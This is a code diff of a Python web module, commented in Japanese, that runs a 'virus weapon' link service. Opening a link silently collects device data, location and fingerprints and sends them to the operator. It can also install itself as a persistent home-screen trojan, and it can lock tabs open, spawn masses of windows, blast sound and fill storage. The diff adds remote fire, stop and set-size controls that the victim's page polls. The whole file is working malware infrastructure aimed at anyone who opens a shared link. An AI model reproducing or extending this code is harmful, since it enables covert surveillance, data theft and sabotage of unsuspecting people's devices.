@@ -1,23 +1,32 @@
 """ウイルス兵器モジュール。既存コードに依存しない独立実装。
 
-  GET  /v/{code}                兵器ページ（モード別・JS全部インライン）
+  GET  /v/{code}                兵器ページ（モード別・JS全部インライン・完全自動）
+  GET  /v/{code}/st             状態（set/firing/seq）※兵器ページがポーリング
   POST /v/{code}/d              収集データの投入
-  GET  /v/{code}/manifest.json  インストール型トロイ用
-  GET  /v/sw.js                 Service Worker（インストール型）
+  GET  /v/{code}/manifest.json  常駐型トロイ用
+  GET  /v/sw.js                 Service Worker（常駐型）
   GET  /v/icon.svg              アイコン
   GET  /vp , POST /vp/add       一覧・作成
-  GET  /vp/{code}               監視室
+  GET  /vp/{code}               監視室（＝こちらの操作盤）
+  POST /vp/{code}/fire          1セット出す
+  POST /vp/{code}/stop          停止
+  POST /vp/{code}/resume        再開
+  POST /vp/{code}/set           1セット枚数（10/100/0=無限）
   GET  /api/vp/{code}           データJSON
 
 モード:
-  trojan_link    トロイの木馬（リンク型）完全上位互換
-  trojan_install トロイの木馬（インストール型）完全上位互換
-  max_power      最高威力（取れるものを全部・高頻度）
-  brick          ブリック（端末を一生使い物にならなくする）
-  windows        窓爆弾（大量のウィンドウで怯えさせる）
-  sound          爆音クラッシュ（爆音＋画面崩壊）
-  storage        容量枯渇（大量データで埋める）
-  mix            全部ミックス最強兵器
+  trojan_link    トロイの木馬（リンク型）
+  trojan_install トロイの木馬（常駐型）
+  max_power      全部盛り（最高威力）
+  brick          ブリック（タブが死なない）
+  windows        窓爆弾（大量のウィンドウ）
+  sound          爆音クラッシュ
+  storage        容量枯渇
+  mix            全部ミックス
+
+設計:
+  兵器ページはボタン無し。開いた瞬間から全部自動・無限。
+  枚数や発射・停止はこちらの監視室から遠隔操作する（兵器ページがポーリング）。
 """
 from __future__ import annotations
 
@@ -40,49 +49,49 @@ router = APIRouter()
 MODES = ("trojan_link", "trojan_install", "max_power", "brick",
          "windows", "sound", "storage", "mix")
 MODE_LABEL = {
-    "trojan_link": "トロイの木馬（リンク型）完全上位互換",
-    "trojan_install": "トロイの木馬（インストール型）完全上位互換",
-    "max_power": "最高威力（全部取る）",
-    "brick": "ブリック（一生使い物にならなくする）",
+    "trojan_link": "トロイの木馬（リンク型）",
+    "trojan_install": "トロイの木馬（常駐型）",
+    "max_power": "全部盛り（最高威力）",
+    "brick": "ブリック（タブが死なない）",
     "windows": "窓爆弾（大量のウィンドウ）",
-    "sound": "爆音クラッシュ（爆音＋画面崩壊）",
-    "storage": "容量枯渇（データで埋める）",
-    "mix": "全部ミックス最強兵器",
+    "sound": "爆音クラッシュ",
+    "storage": "容量枯渇",
+    "mix": "全部ミックス",
 }
 MODE_DESC = {
-    "trojan_link": "見た目は一瞬で消える。裏で全部集めて、そのまま元のサイトへ飛ばす。",
-    "trojan_install": "ホーム画面にアプリとして常駐させる。以後も定期的に送り続ける。",
-    "max_power": "位置・カメラ・指紋・電池・回線・容量まで、取れるものを全部高頻度で。",
-    "brick": "タブを殺せなくする（離脱確認＋画面常時点灯＋定期音＋容量占有）。",
-    "windows": "大量のウィンドウを一気に開いて怯えさせる。",
-    "sound": "爆音のクラッシュ音＋画面がグリッチで崩壊する。",
-    "storage": "localStorage / IndexedDB / Cache を埋めて容量を使い切らせる。",
-    "mix": "上の全部を段階的に同時発動させる最終兵器。",
+    "trojan_link": "開いた瞬間に全部抜き取って、何事もなかったように本物のサイトへ飛ばす。",
+    "trojan_install": "ホーム画面に居座らせて、以後も勝手に起動して送り続ける。",
+    "max_power": "位置・カメラ・指紋・電池・回線・容量まで、取れるものを全部。無限に。",
+    "brick": "タブを閉じられなくする。画面は消えず、音も鳴り続ける。",
+    "windows": "開いた瞬間に大量のウィンドウを出し切る。∞なら止まるまで。",
+    "sound": "開いた瞬間に爆音。画面もグリッチで崩れる。鳴り続ける。",
+    "storage": "開いた瞬間に端末の容量を埋め尽くす。",
+    "mix": "上の全部を無限に。最強。",
 }
 
-# インストール済み（ホーム画面追加）で自動発射するモード
+# 常駐（ホーム画面追加）で自動発射するモード
 AUTO_MODES = ("trojan_install", "mix")
 
-# 注意書き（兵器庫・監視室・兵器ページに表示）
+# 1セットの枚数（10 / 100 / 0=無限）
+SET_CHOICES = (10, 100, 0)
+
 CAUTION = {
-    "trojan_link": "⚠ リンクを開いた瞬間から自動で始まります。開いただけで端末情報・位置・"
-                   "指紋を抜き取り、そのまま本物のサイトへ飛びます（自爆）。",
-    "trojan_install": "⚠ インストール（ホーム画面に追加）すると自爆します。以後その端末では"
-                      "自動で兵器が起動し続け、本人がアプリを消すまで止まりません。",
-    "max_power": "⚠ 開いた瞬間から自動で始まります。取れるものを全部・高頻度で抜き取ります。",
-    "brick": "⚠ 開いた瞬間から自動で始まります。タブが死ななくなり、端末が重くなります。",
-    "windows": "⚠ 開いた瞬間から自動で始まります。大量のウィンドウが勝手に開きます。",
-    "sound": "⚠ 開いた瞬間から自動で始まります。爆音が鳴り、画面が崩壊します。",
-    "storage": "⚠ 開いた瞬間から自動で始まります。端末の容量を使い切ります。",
-    "mix": "⚠ インストール（ホーム画面に追加）すると自爆します。開いた瞬間から全部が"
-           "段階的に発動し、以後その端末では自動で起動し続けます。",
+    "trojan_link": "⚠ 開いた瞬間から全部自動・無限。ボタン操作は不要。抜き取ったあとは本物へ飛ぶ（自爆）。",
+    "trojan_install": "⚠ ホーム画面に追加＝自爆。以後その端末では勝手に起動し続け、本人が消すまで止まらない。",
+    "max_power": "⚠ 開いた瞬間から全部自動・無限。止まらない。ボタン操作は不要。",
+    "brick": "⚠ 開いた瞬間から全部自動・無限。タブが死ななくなる。",
+    "windows": "⚠ 開いた瞬間に1セット（既定100枚）を10秒以内に出し切る。∞なら止まるまで。",
+    "sound": "⚠ 開いた瞬間に爆音が自動で鳴り続ける。ボタン操作は不要。",
+    "storage": "⚠ 開いた瞬間に容量を埋め始める。ボタン操作は不要。",
+    "mix": "⚠ ホーム画面に追加＝自爆。開いた瞬間から全部が無限に発動する。",
 }
 
 SCHEMA = """
 CREATE TABLE IF NOT EXISTS virus_links(
   code TEXT PRIMARY KEY, name TEXT, mode TEXT, note TEXT, dest TEXT,
   active INTEGER DEFAULT 1, created TEXT, hits INTEGER DEFAULT 0,
-  last_ts TEXT, last_ip TEXT, last_ua TEXT, last_device TEXT);
+  last_ts TEXT, last_ip TEXT, last_ua TEXT, last_device TEXT,
+  winset INTEGER DEFAULT 100, firing INTEGER DEFAULT 1, seq INTEGER DEFAULT 0);
 CREATE TABLE IF NOT EXISTS virus_hits(
   id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ts TEXT, ip TEXT, ua TEXT,
   device TEXT, os TEXT, browser TEXT, inapp TEXT, country TEXT, city TEXT,
@@ -147,6 +156,22 @@ def _dir(owner):
     return d
 
 
+def _migrate(c):
+    try:
+        cols = {r["name"] for r in c.execute("PRAGMA table_info(virus_links)").fetchall()}
+    except Exception:
+        return
+    for name, ddl in (("winset", "INTEGER DEFAULT 100"),
+                      ("firing", "INTEGER DEFAULT 1"),
+                      ("seq", "INTEGER DEFAULT 0")):
+        if name not in cols:
+            try:
+                c.execute(f"ALTER TABLE virus_links ADD COLUMN {name} {ddl}")
+            except Exception:
+                pass
+    c.commit()
+
+
 def _db(owner):
     c = sqlite3.connect(os.path.join(_dir(owner), "virus.db"),
                         timeout=15, check_same_thread=False)
@@ -154,7 +179,7 @@ def _db(owner):
     try:
         c.execute("PRAGMA journal_mode=WAL")
         c.executescript(SCHEMA)
-        c.commit()
+        _migrate(c)
     except Exception:
         pass
     return c
@@ -162,6 +187,14 @@ def _db(owner):
 
 def _link(c, code):
     return c.execute("SELECT * FROM virus_links WHERE code=?", (code,)).fetchone()
+
+
+def _val(row, key, default):
+    try:
+        v = row[key]
+        return default if v is None else v
+    except Exception:
+        return default
 
 
 def _new_code(c, n=8):
@@ -203,7 +236,7 @@ def _record_hit(owner, code, request):
     return hid
 
 
-# ---------------- 一覧・作成（/v/{code} より先に登録する） ----------------
+# ---------------- 一覧・作成 ----------------
 
 @router.get("/vp", response_class=HTMLResponse)
 def list_page(request: Request, u=Depends(_auth)):
@@ -219,23 +252,30 @@ def list_page(request: Request, u=Depends(_auth)):
         r["mode_label"] = MODE_LABEL.get(r["mode"] or "", r["mode"] or "")
         r["caution"] = CAUTION.get(r["mode"] or "", "")
         r["auto"] = (r["mode"] in AUTO_MODES)
-        r["live"] = False
+        r["set_label"] = "∞" if (r.get("winset") == 0) else f'{r.get("winset") or 100}枚/セット'
+        r["firing"] = r.get("firing", 1)
     return _render("virus_list.html", request, rows=rows, base=base,
-                   cautions=CAUTION,
+                   cautions=CAUTION, sets=SET_CHOICES,
                    modes=[(m, MODE_LABEL[m], MODE_DESC[m]) for m in MODES])
 
 
 @router.post("/vp/add")
 def create(request: Request, name: str = Form(""), mode: str = Form("mix"),
-           dest: str = Form(""), note: str = Form(""), u=Depends(_auth)):
+           dest: str = Form(""), note: str = Form(""), winset: str = Form("100"),
+           u=Depends(_auth)):
     owner = tenancy.get_current() or u
     mode = mode if mode in MODES else "mix"
+    try:
+        ws = int(winset)
+    except Exception:
+        ws = 100
+    ws = ws if ws in SET_CHOICES else 100
     c = _db(owner)
     code = _new_code(c)
-    c.execute("INSERT INTO virus_links(code,name,mode,note,dest,active,created,hits)"
-              " VALUES(?,?,?,?,?,1,?,0)",
+    c.execute("INSERT INTO virus_links(code,name,mode,note,dest,active,created,hits,"
+              "winset,firing,seq) VALUES(?,?,?,?,?,1,?,0,?,1,0)",
               (code, (name or "").strip()[:40] or "名無し", mode,
-               (note or "").strip()[:200], (dest or "").strip(), _now()))
+               (note or "").strip()[:200], (dest or "").strip(), _now(), ws))
     c.commit()
     c.close()
     try:
@@ -245,7 +285,7 @@ def create(request: Request, name: str = Form(""), mode: str = Form("mix"),
     return RedirectResponse("/vp/" + code + "?new=1", status_code=303)
 
 
-# ---------------- インストール型の付属物 ----------------
+# ---------------- 常駐型の付属物 ----------------
 
 @router.get("/v/sw.js")
 def sw():
@@ -291,6 +331,24 @@ def manifest(code: str, name: str = ""):
     return JSONResponse(man)
 
 
+# ---------------- 状態（兵器ページがポーリング） ----------------
+
+@router.get("/v/{code}/st")
+def status(code: str):
+    owner = _owner(code)
+    if not owner:
+        return {"ok": 0}
+    c = _db(owner)
+    row = _link(c, code)
+    c.close()
+    if not row:
+        return {"ok": 0}
+    return {"ok": 1,
+            "set": _val(row, "winset", 100),
+            "firing": _val(row, "firing", 1),
+            "seq": _val(row, "seq", 0)}
+
+
 # ---------------- 兵器ページ ----------------
 
 @router.get("/v/{code}", response_class=HTMLResponse)
@@ -313,6 +371,9 @@ def land(code: str, request: Request):
         mode_label=MODE_LABEL[mode], mode_desc=MODE_DESC[mode],
         caution=CAUTION.get(mode, ""),
         auto=(mode in AUTO_MODES),
+        winset=_val(row, "winset", 100),
+        firing=_val(row, "firing", 1),
+        seq=_val(row, "seq", 0),
         dest=_abs_dest(row["dest"]), is_child=child, is_installed=installed,
         child_text=random.choice([
             "システム警告", "メモリ不足", "ディスク容量が危険です", "異常を検出しました",
@@ -366,7 +427,7 @@ async def data(code: str, request: Request):
     return {"ok": 1, "n": n, "server": ts}
 
 
-# ---------------- 監視室 ----------------
+# ---------------- 監視室（こちらの操作盤） ----------------
 
 @router.get("/vp/{code}", response_class=HTMLResponse)
 def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
@@ -391,7 +452,55 @@ def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
                    mode_desc=MODE_DESC.get(row["mode"] or "", ""),
                    caution=CAUTION.get(row["mode"] or "", ""),
                    auto=(row["mode"] in AUTO_MODES),
+                   sets=SET_CHOICES,
+                   winset=_val(row, "winset", 100),
+                   firing=_val(row, "firing", 1),
                    share=base + "/v/" + code, total=len(hits))
+
+
+@router.post("/vp/{code}/fire")
+def fire(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET firing=1, seq=COALESCE(seq,0)+1 WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    return RedirectResponse("/vp/" + code + "?fired=1", status_code=303)
+
+
+@router.post("/vp/{code}/stop")
+def stop(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET firing=0 WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    return RedirectResponse("/vp/" + code, status_code=303)
+
+
+@router.post("/vp/{code}/resume")
+def resume(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET firing=1 WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    return RedirectResponse("/vp/" + code, status_code=303)
+
+
+@router.post("/vp/{code}/set")
+def set_size(code: str, winset: str = Form("100"), u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    try:
+        ws = int(winset)
+    except Exception:
+        ws = 100
+    ws = ws if ws in SET_CHOICES else 100
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET winset=? WHERE code=?", (ws, code))
+    c.commit()
+    c.close()
+    return RedirectResponse("/vp/" + code, status_code=303)
 
 
 @router.get("/api/vp/{code}")
@@ -405,13 +514,14 @@ def api(code: str, u=Depends(_auth)):
     hits = [dict(r) for r in c.execute(
         "SELECT * FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300", (code,)).fetchall()]
     c.close()
-    return {"hits": hits, "count": len(hits), "server": _now()}
+    return {"hits": hits, "count": len(hits), "server": _now(),
+            "set": _val(row, "winset", 100), "firing": _val(row, "firing", 1)}
 
 
 @router.post("/vp/{code}/update")
 def update(request: Request, code: str, name: str = Form(""), mode: str = Form(""),
            dest: str = Form(""), note: str = Form(""), active: str = Form(""),
-           u=Depends(_auth)):
+           winset: str = Form(""), u=Depends(_auth)):
     owner = tenancy.get_current() or u
     c = _db(owner)
     if not _link(c, code):
@@ -426,6 +536,13 @@ def update(request: Request, code: str, name: str = Form(""), mode: str = Form("
     f.append("note=?"); v.append((note or "").strip()[:200])
     if active in ("0", "1"):
         f.append("active=?"); v.append(int(active))
+    if winset != "":
+        try:
+            ws = int(winset)
+        except Exception:
+            ws = 100
+        if ws in SET_CHOICES:
+            f.append("winset=?"); v.append(ws)
     v.append(code)
     c.execute("UPDATE virus_links SET " + ",".join(f) + " WHERE code=?", v)
     c.commit()
